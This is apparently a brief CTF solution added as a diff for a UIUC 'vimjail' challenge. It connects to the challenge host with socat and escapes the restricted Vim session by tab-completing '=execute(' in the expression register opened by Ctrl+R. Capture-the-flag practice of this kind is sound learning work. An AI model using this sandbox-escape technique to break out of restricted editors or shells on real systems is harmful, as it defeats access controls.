@@ -1,0 +1,8 @@
+socat file:$(tty),raw,echo=0 tcp:vimjail2-5.chal.uiuc.tf:133
+
+Ctrl + R
+
+after inserting "=" tab untill you have "=execute("
+
+then you can type the last piece:
+=execute("q")
